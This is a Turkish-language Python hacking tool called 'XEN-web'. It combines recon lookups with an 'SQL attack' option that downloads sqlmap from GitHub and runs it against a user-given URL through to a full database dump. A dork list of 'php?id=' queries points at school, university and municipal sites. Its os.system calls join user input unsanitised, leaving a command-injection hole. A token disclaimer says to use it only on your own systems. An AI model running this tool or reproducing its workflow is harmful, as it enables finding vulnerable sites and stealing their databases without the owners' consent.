import subprocess
import platform
import socket
import dns.resolver
import whois
import requests
import os
import time
import sys
from colorama import Fore, Style

os.system("clear")
os.system("pip3 install python-whois")
os.system("pip3 install requests")
os.system("pip3 install dnspython")
os.system("clear")

print(Fore.RED + "")
def get_local_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip
    except socket.error:
        return "IP adresi alınamadı."

ip_address = get_local_ip()
print("ip adresin:", ip_address)
hostname = socket.gethostname()
print("ana bilgisayar adın:", hostname)
response = requests.get("http://ip-api.com/json")
data = response.json()
gateway = data["query"]
print("Kullanılan ip:", gateway)
time.sleep(2)

print(Fore.GREEN + "")
def yukleme_animasyonu():
    animasyon_karakterleri = ["|", "/", "-", "\\"]
    for i in range(10):
        animasyon = f"Yükleniyor... {animasyon_karakterleri[i % len(animasyon_karakterleri)]}"
        sys.stdout.write(animasyon)
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write("\b" * len(animasyon))
        sys.stdout.flush()

yukleme_animasyonu()
print("Yüklendi <3")

os.system("clear")

print(Fore.RED + """
__  _______ _   _    __        _______ ____
\ \/ / ____| \ | |   \ \      / / ____| __ )
 \  /|  _| |  \| |____\ \ /\ / /|  _| |  _ \ 
 /  \| |___| |\  |_____\ V  V / | |___| |_) |
/_/\_\_____|_| \_|      \_/\_/  |_____|____/

   <vulnerability tool 1.2v>
   
   github -> https://github.com/ghost0x02/xen-web

   instagram -> xsecit

""")
print(Style.RESET_ALL)

print(Fore.CYAN + """

(1)> PING TARA <
(2)> DNS SORGU <
(3)> WHOIS SORGU <
(4)> HTTP KONTROLÜ <
(5)> SQL SALDIRISI <
(6)> KULLANIM KOŞULLARI <
(7)> DORK ÜRETİCİSİ <
(8)> WHATWEB??? <
(9)> ÇIKIŞ <

""")

print(Style.RESET_ALL)

print(Fore.YELLOW + "")
islemno = input("root@XEN-web:~ ")
print(Style.RESET_ALL)

def ping(host):
    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


██████╗ ██╗███╗   ██╗ ██████╗
██╔══██╗██║████╗  ██║██╔════╝
██████╔╝██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║██║╚██╗██║██║   ██║
██║     ██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ """)


    print(Fore.GREEN + "")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '4', host]
    response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if response.returncode == 0:
        print(f"{host} adresine başarıyla ping atıldı.")
        print(response.stdout)
    else:
        print(f"{host} adresine ping atılamadı.")
        print(response.stderr)

def dns_lookup(domain):
    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


 ▄▄▄▄▄▄▄▄▄▄   ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄
▐░░░░░░░░░░▌ ▐░░▌      ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀
▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌
▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄
▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌    ▐░▌▐░▌          ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░▌      ▐░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀""")

    print(Fore.GREEN + "")
    record_types = ['A', 'MX', 'NS', 'TXT', 'SOA']
    resolver = dns.resolver.Resolver()
    for record_type in record_types:
        try:
            answers = resolver.resolve(domain, record_type)
            for answer in answers:
                print(f"{record_type} : {answer.to_text()}")
        except dns.resolver.NoAnswer:
            print(f"{record_type} kaydı bulunamadı.")
        except dns.resolver.NXDOMAIN:
            print(f"{domain} alan adı bulunamadı.")
            break
        except Exception as e:
            print(f"Bir hata oluştu: {e}")
            break

def whois_lookup(domain):
    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


 __    __  __ __   ___  ____  _____
|  T__T  T|  T  T /   \l    j/ ___/
|  |  |  ||  l  |Y     Y|  T(   \_ 
|  |  |  ||  _  ||  O  ||  | \__  T
l  `  '  !|  |  ||     ||  | /  \ |
 \      / |  |  |l     !j  l \    |
  \_/\_/  l__j__j \___/|____j \___j
                                   """)
    print(Fore.GREEN + "")

    try:
        w = whois.whois(domain)
        details = {
            'domain_name': 'Domain Adı',
            'registrar': 'Registrar',
            'whois_server': 'WHOIS Sunucusu',
            'referral_url': 'Referral URL',
            'updated_date': 'Güncellenme Tarihi',
            'creation_date': 'Oluşturulma Tarihi',
            'expiration_date': 'Son Kullanma Tarihi',
            'name_servers': 'Ad Sunucuları',
            'status': 'Durum',
            'emails': 'Email',
            'dnssec': 'DNSSEC',
            'name': 'İsim',
            'org': 'Organizasyon',
            'address': 'Adres',
            'city': 'Şehir',
            'state': 'Eyalet',
            'zipcode': 'Posta Kodu',
            'country': 'Ülke'
        }
        for key, value in details.items():
            if key in w and w[key]:
                print(f"{value}: {w[key]}")
    except Exception as e:
        print(f"WHOIS sorgusunda bir hata oluştu: {e}")

def http_header_check(url):
    os.system("clear")
    print(Fore.MAGENTA + "")
    print("""


  ▄█    █▄        ███         ███        ▄███████▄
  ███    ███   ▀█████████▄ ▀█████████▄   ███    ███
  ███    ███      ▀███▀▀██    ▀███▀▀██   ███    ███
 ▄███▄▄▄▄███▄▄     ███   ▀     ███   ▀   ███    ███
▀▀███▀▀▀▀███▀      ███         ███     ▀█████████▀
  ███    ███       ███         ███       ███
  ███    ███       ███         ███       ███
  ███    █▀       ▄████▀      ▄████▀    ▄████▀
                                              """)

    print(Fore.GREEN + "")

    try:
        response = requests.head(url)
        print(f"HTTP Başlıklar:\n")
        for header, value in response.headers.items():
            print(f"{header}: {value}")
    except Exception as e:
        print(f"HTTP Kontrolü sırasında bir hata oluştu: {e}")

def sql_attack():
    os.system("clear")
    print(Fore.RED + "")  
    print("""
 █████████     ██████    █████
 ███░░░░░███  ███░░░░███ ░░███
░███    ░░░  ███    ░░███ ░███
░░█████████ ░███     ░███ ░███
 ░░░░░░░░███░███   ██░███ ░███      █
░░█████████  ░░░██████░██ ███████████
 ░░░░░░░░░     ░░░░░░ ░░ ░░░░░░░░  """)
    print(Style.RESET_ALL)
    print(Fore.CYAN + "")
    print("Bu program enesxsec ve ghost0x02 tarafından kodlanmıştır...")
    print("---------------------------------------------------")
    print("Bir dakika...")
    time.sleep(1)
    os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
    os.chdir("sqlmap-dev")
    os.system("python3 sqlmap.py -u " + url + " --dbs")
    db = input("Hangi veritabanının içe aktarılacağını seçin: ")
    os.system("clear")
    os.system("python3 sqlmap.py -u " + url + " -D " + db + " --tables")
    tb = input("Hangi tabloyu çekeceğinizi seçin: ")
    os.system("clear")
    os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " --columns")
    cl = input("Hangi sütunları çekeceğinizi seçin: ")
    os.system("clear")
    os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " -C " + cl + " --dump")

def kullanım_koşulları():
    print(Fore.GREEN + """



          KULLANIM KOŞULLARINA HOŞ GELDİNİZ""")

    print("          yükleniyor...        ")
    time.sleep(4)
    os.system("clear")
    print(Fore.RED + """

{__   {__  {__     {__{__      {__            {_       {___     {__{__{__       {__
{__  {__   {__     {__{__      {__           {_ __     {_ {__   {__{__{_ {__   {___
{__ {__    {__     {__{__      {__          {_  {__    {__ {__  {__{__{__ {__ { {__
{_ {_      {__     {__{__      {__         {__   {__   {__  {__ {__{__{__  {__  {__
{__  {__   {__     {__{__      {__        {______ {__  {__   {_ {__{__{__   {_  {__
{__   {__  {__     {__{__      {__       {__       {__ {__    {_ __{__{__       {__
{__     {__  {_____   {________{________{__         {__{__      {__{__{__       {__



    (1) SORGU YAPARKEN TAMAMEN KENDİ SİSTEMLERİNİZ ÜZERİNDEN YAPIN
    (2) BU SİBER GÜVENLİK YAZILIMININ SORUMLUSU HERHANGİ BİR YASAL İŞLEM KABUL ETMEYECEKTİR!!!
    (3) SQL GİBİ BÜYÜK ZAFİYET TARAYAN PROGRAMLARI SADECE TEST İÇİN KULLANIN
    (4) YAPILAN BÜTÜN TARAMALAR KENDİ SORUMLULUĞUNUZ ÜZERİNEDİR
    (5) SQL SALDIRISI NEDİR?

        SQL saldırısı (SQL Injection),
        web uygulamalarında yaygın olarak görülen bir güvenlik açığıdır.
        Bu açık, saldırganların web uygulamalarının SQL tabanlı veritabanlarına istismar ederek
        kötü niyetli SQL sorguları göndermesine izin verir.

    (6) NEYİ HEDEFLİYORUZ?

       - internet sitelerinin güvenlik açıklarını test etmeyi.
       - Eğer açık bulunduysa site sahiplerine bildirmeyi.
       - SQL gibi zafiyet araçlarının doğru kullanımını.
       - Siber Güvenlik yapmak için saygın birisi olmanızı hedefliyoruz :D <3.
    (7)

       - Whatweb kullanarak hedef sistem üzerinde detaylı web teknolojisi taramaları yapabilirsiniz.
        
                       iletişim == ig: xsecit """)

def dork():
    os.system("clear")
    print(Fore.RED + """

'||''|.    ..|''||   '||''|.   '||'  |'
 ||   ||  .|'    ||   ||   ||   || .'
 ||    || ||      ||  ||''|'    ||'|.
 ||    || '|.     ||  ||   |.   ||  ||
.||...|'   ''|...|'  .||.  '|' .||.  ||.

         (DORK LİSTESİ)""")

    time.sleep(2)
    print(Fore.CYAN + """

    inurl:"php?id=" "com"
    inurl:"php?id=" "edu"
    """)
    time.sleep(2)
    print(""" 

    inurl:"php?id=" "net"
    inurl:"php?id=" "edu.tr"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "biz"
    inurl:"php?id=" "org"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "cat"
    inurl:"php?id=" "k12.tr"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "bel.tr"
    inurl:"php?id=" "br"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "ar"
    inurl:"php?id=" "az"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "cn"
    inurl:"php?id=" "it"
    """)
    time.sleep(2)
    print("""

    inurl:"php?id=" "pk"
    inurl:"php?id=" "pl"
    """)

def whatweb():
    os.system("clear")
    print(Fore.YELLOW + "")
    os.system(f"whatweb -v {url}")

def exit():
    print(Fore.CYAN + "Görüşürüz dost!")

if islemno == "1":
    print(Fore.MAGENTA + "")
    host = input("Ping taramak istediğiniz IP adresini veya site adını girin: ")
    ping(host)
elif islemno == "2":
    print(Fore.MAGENTA + "")
    domain = input("DNS sorgusu yapmak istediğiniz site adını girin: ")
    dns_lookup(domain)
elif islemno == "3":
    print(Fore.MAGENTA + "")
    domain = input("WHOIS sorgusu yapmak istediğiniz site adını girin: ")
    whois_lookup(domain)
elif islemno == "4":
    print(Fore.MAGENTA + "")
    url = input("HTTP kontrolü yapmak istediğiniz URL'yi girin: ")
    http_header_check(url)
elif islemno == "5":
    print(Fore.MAGENTA + "")
    url = input("SQL saldırısı yapmak istediğiniz URL adresini girin: ")
    sql_attack()
elif islemno == "6":
    print(Fore.MAGENTA + "")
    kullanım_koşulları()
elif islemno == "7":
    dork()
elif islemno == "8":
    print(Fore.MAGENTA + "")
    url = input("Detaylı WEB taraması için host adını girin örnek ->[](https://example.com): ")
    whatweb()
elif islemno == "9":
    exit()
else:
    print(Fore.RED + "Geçersiz seçenek!!!")
